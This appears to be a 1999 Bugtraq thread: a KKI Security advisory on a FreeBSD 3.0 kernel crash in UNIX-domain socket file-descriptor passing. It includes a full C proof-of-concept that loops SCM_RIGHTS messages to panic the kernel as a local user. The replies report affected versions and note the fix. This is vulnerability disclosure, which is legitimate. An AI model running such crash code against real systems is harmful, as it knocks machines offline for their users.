From: Lukasz Luzar <lluzar@SECURITY.KKI.PL>
To: BUGTRAQ@netspace.org
Subject: KKIS.05051999.003b
Parts/Attachments:
   1 Shown     50 lines  Text
   2   OK    ~3.4 KB     Text, ""
----------------------------------------

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                          ###  ###  ###  ###  ###
                          ### ###   ### ###   ###
                          ######    ######    ###
                          ### ###   ### ###   ###
                          ###  ###  ###  ###  ###

                              S E C U R I T Y

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Contacts ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 KKI Security Team                              Cracow Commercial Internet
 http://www.security.kki.pl                     http://www.kki.pl
 mailto:security@security.kki.pl                mailto:biuro@kki.pl

~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Informations ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Report title        : Security problem with sockets in FreeBSD's
                       implementation of UNIX-domain protocol family.
 Problem found by    : Lukasz Luzar (lluzar@security.kki.pl)
 Report created by   : Robert Pajak (shadow@security.kki.pl)
                       Lukasz Luzar (lluzar@security.kki.pl)
 Raport published    : 5th May 1999
 Raport code         : KKIS.05051999.003.b
 Systems affected    : FreeBSD-3.0 and maybe 3.1,
 Archive             : http://www.security.kki.pl/advisories/
 Risk level          : high

~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Description ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  As you know, "The UNIX-domain protocol family is a collection of protocols
 that provides local interprocess communication through the normal socket
 mechanism. It supports the SOCK_STREAM and SOCK_DGRAM soceket types and uses
 filesystem pathnames for addressing."
 The SOCK_STREAM sockets also supports the communication of UNIX file
 descriptors through the use of functions sendmsg() and recvmsg().
  While testing UNIX-domain protocols, we have found probable bug in
 FreeBSD's implementation of this mechanism.
  When we had run attached example on FreeBSD-3.0 as local user, system
 had crashed imediatelly with error "Supervisor read, page not present"
 in kernel mode.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Example ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Look to attached example.

~~~~~~~~~~~~~~~~~~~~~~~~~[ Copyright statement ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Copyright (c) 1999 KKI Security Team, Poland
 All rights reserved.

 All questions please address to mailto:security@security.kki.pl
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


    [ Part 2, ""  Text/PLAIN (Name: "example.c")  73 lines. ]


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>

#define PATH "/tmp/123"
#define PATH_TMP "/tmp/123.tmp"
#define SOME_FILE "/etc/passwd"

struct mycmsghdr {
        struct cmsghdr hdr;
        int     fd;
};

extern errno;

void server();
void client();

void main()
{
        switch ( fork()) {
        case -1:
                printf( "fork error %d\n",errno);
                break;
        case 0:
                for (;;) client();
        default:
                server();
        }
}

void server()
{
        struct sockaddr_un addr;
        struct msghdr mymsghdr;
        struct mycmsghdr ancdbuf;
        char    data[ 1];
        int     sockfd,
                len,
                fd;

        if ( unlink( PATH) == -1)
                printf( "unlink error %d\n",errno);

        if (( sockfd = socket( AF_UNIX,SOCK_DGRAM,0)) == -1)
                printf( "socket error %d\n",errno);

        strcpy( addr.sun_path,PATH);
        addr.sun_len = sizeof( addr.sun_len) + sizeof( addr.sun_family) 
                        + strlen( addr.sun_path); 
        addr.sun_family = AF_UNIX;

        if ( bind( sockfd,(struct sockaddr *) &addr,addr.sun_len) == -1)
                printf( "bind error %d\n",errno);

        for (;;) {

                if (( fd = open( SOME_FILE,O_RDONLY)) == -1) 
                        printf( "open file error %d\n",errno);

                len = sizeof( addr.sun_path);

                if ( recvfrom( sockfd,&data,sizeof( data),0,
                        (struct sockaddr *) &addr,&len) == -1) 
                        printf( "recvfrom error %d\n",errno);

                ancdbuf.hdr.cmsg_len = sizeof( ancdbuf);
                ancdbuf.hdr.cmsg_level = SOL_SOCKET;
                ancdbuf.hdr.cmsg_type = SCM_RIGHTS;
                ancdbuf.fd = fd;

                mymsghdr.msg_name = (caddr_t) &addr;
                mymsghdr.msg_namelen = len;
                mymsghdr.msg_iov = NULL;
                mymsghdr.msg_iovlen = 0;
                mymsghdr.msg_control = (caddr_t) &ancdbuf;
                mymsghdr.msg_controllen = ancdbuf.hdr.cmsg_len;
                mymsghdr.msg_flags = 0;
                
                if ( sendmsg( sockfd,&mymsghdr,0) == -1) 
                        printf( "sendmsg error %d\n",errno);

                close( fd);
        }
}

void client()
{
        struct sockaddr_un      addr_s,
                                addr_c;
        struct mycmsghdr        ancdbuf;
        struct msghdr           mymsghdr;
        char    data[ 1];
        int     sockfd,
                len,
                fd;

        if (( sockfd = socket( AF_UNIX,SOCK_DGRAM,0)) == -1) 
                printf( "socket error %d\n",errno);

        if ( unlink( PATH_TMP) == -1)
                printf( "unlink error %d\n",errno);

        strcpy( addr_c.sun_path,PATH_TMP);
        addr_c.sun_len = sizeof( addr_c.sun_len) + sizeof(addr_c.sun_family) 
                          + strlen( addr_c.sun_path);
        addr_c.sun_family = AF_UNIX;

        strcpy( addr_s.sun_path,PATH);
        addr_s.sun_len = sizeof( addr_s.sun_len) + sizeof(addr_s.sun_family)
                           + strlen( addr_s.sun_path);
        addr_s.sun_family = AF_UNIX;

        if ( bind( sockfd,(struct sockaddr*) &addr_c,addr_c.sun_len) == -1)
                printf( "bind error %d\n",errno);

        if ( sendto( sockfd,&data,sizeof( data),0,(struct sockaddr *) &addr_s,
                addr_s.sun_len) == -1) 
                printf( "sendto error %d\n",errno);

        len = addr_s.sun_len;

        ancdbuf.hdr.cmsg_len = sizeof( ancdbuf);
        ancdbuf.hdr.cmsg_level = SOL_SOCKET;
        ancdbuf.hdr.cmsg_type = SCM_RIGHTS;

        mymsghdr.msg_name = NULL;
        mymsghdr.msg_namelen = 0;
        mymsghdr.msg_iov = NULL;
        mymsghdr.msg_iovlen = 0;
        mymsghdr.msg_control = (caddr_t) &ancdbuf;
        mymsghdr.msg_controllen = ancdbuf.hdr.cmsg_len;
        mymsghdr.msg_flags = 0;

        if ( recvmsg( sockfd,&mymsghdr,0) == -1)
                printf( "recvmsg error %d\n",errno);

        fd = ancdbuf.fd;
        
        close(fd);
        close( sockfd);
}

--------------------------------------------------------------------------------------

Date: Thu, 6 May 1999 14:10:49 -0500
From: Kevin Day <toasty@HOME.DRAGONDATA.COM>
To: BUGTRAQ@netspace.org
Subject: Re: KKIS.05051999.003b

> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Informations ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>  Report title        : Security problem with sockets in FreeBSD's
>                        implementation of UNIX-domain protocol family.
>  Problem found by    : Lukasz Luzar (lluzar@security.kki.pl)
>  Report created by   : Robert Pajak (shadow@security.kki.pl)
>                        Lukasz Luzar (lluzar@security.kki.pl)
>  Raport published    : 5th May 1999
>  Raport code         : KKIS.05051999.003.b
>  Systems affected    : FreeBSD-3.0 and maybe 3.1,
>  Archive             : http://www.security.kki.pl/advisories/
>  Risk level          : high
>
> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Description ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>   As you know, "The UNIX-domain protocol family is a collection of protocols
>  that provides local interprocess communication through the normal socket
>  mechanism. It supports the SOCK_STREAM and SOCK_DGRAM soceket types and uses
>  filesystem pathnames for addressing."
>  The SOCK_STREAM sockets also supports the communication of UNIX file
>  descriptors through the use of functions sendmsg() and recvmsg().
>   While testing UNIX-domain protocols, we have found probable bug in
>  FreeBSD's implementation of this mechanism.
>   When we had run attached example on FreeBSD-3.0 as local user, system
>  had crashed imediatelly with error "Supervisor read, page not present"
>  in kernel mode.
>

Here's my testing so far:

2.2.2 - Vulnerable
2.2.6 - Vulnerable
2.2.8 - Vulnerable
3.1-RELEASE - Ran 15 minutes, no crash.


Kevin Day
DragonData

--------------------------------------------------------------------------------------

Date: Fri, 7 May 1999 11:25:05 +0700
From: Eugeny Kuzakov <kev@LAB321.RU>
To: BUGTRAQ@netspace.org
Subject: Re: KKIS.05051999.003b

On Wed, 5 May 1999, Lukasz Luzar wrote:

> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Informations ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>  Report title        : Security problem with sockets in FreeBSD's
>                        implementation of UNIX-domain protocol family.
>  Problem found by    : Lukasz Luzar (lluzar@security.kki.pl)
>  Report created by   : Robert Pajak (shadow@security.kki.pl)
>                        Lukasz Luzar (lluzar@security.kki.pl)
>  Raport published    : 5th May 1999
>  Raport code         : KKIS.05051999.003.b
>  Systems affected    : FreeBSD-3.0 and maybe 3.1,
>  Archive             : http://www.security.kki.pl/advisories/
>  Risk level          : high
I tryed it under 3.1-stable. No problem.

--
        Best wishes, Eugeny Kuzakov
                Laboratory 321 ( Omsk, Russia )
                kev@lab321.ru
                ICQ#: 5885106

--------------------------------------------------------------------------------------

Date: Fri, 7 May 1999 17:21:24 -0700
From: Don Lewis <Don.Lewis@TSC.TDK.COM>
To: BUGTRAQ@netspace.org
Subject: Re: KKIS.05051999.003b

On May 6,  2:10pm, Kevin Day wrote:
} Subject: Re: KKIS.05051999.003b
} > ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Informations ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
} >  Report title        : Security problem with sockets in FreeBSD's
} >                        implementation of UNIX-domain protocol family.
} >  Problem found by    : Lukasz Luzar (lluzar@security.kki.pl)
} >  Report created by   : Robert Pajak (shadow@security.kki.pl)
} >                        Lukasz Luzar (lluzar@security.kki.pl)
} >  Raport published    : 5th May 1999
} >  Raport code         : KKIS.05051999.003.b
} >  Systems affected    : FreeBSD-3.0 and maybe 3.1,
} >  Archive             : http://www.security.kki.pl/advisories/
} >  Risk level          : high
} >
} > ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[ Description ]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
} >   As you know, "The UNIX-domain protocol family is a collection of protocols
} >  that provides local interprocess communication through the normal socket
} >  mechanism. It supports the SOCK_STREAM and SOCK_DGRAM soceket types and uses
} >  filesystem pathnames for addressing."
} >  The SOCK_STREAM sockets also supports the communication of UNIX file
} >  descriptors through the use of functions sendmsg() and recvmsg().
} >   While testing UNIX-domain protocols, we have found probable bug in
} >  FreeBSD's implementation of this mechanism.
} >   When we had run attached example on FreeBSD-3.0 as local user, system
} >  had crashed imediatelly with error "Supervisor read, page not present"
} >  in kernel mode.
} >
}
} Here's my testing so far:
}
} 2.2.2 - Vulnerable
} 2.2.6 - Vulnerable
} 2.2.8 - Vulnerable
} 3.1-RELEASE - Ran 15 minutes, no crash.

I'd be willing to bet that 3.0-RELEASE is also vulnerable.  I believe
Matt Dillon fixed this earlier this year in revisions 1.38/1.39 (-CURRENT
branch January 21, 1999) and 1.37.2.1 (RELENG_3 branch February 15, 1999) of
sys/kern/uipc-usrreq.c.  The RELENG_3 branch fix was committed just before
3.1-RELEASE.

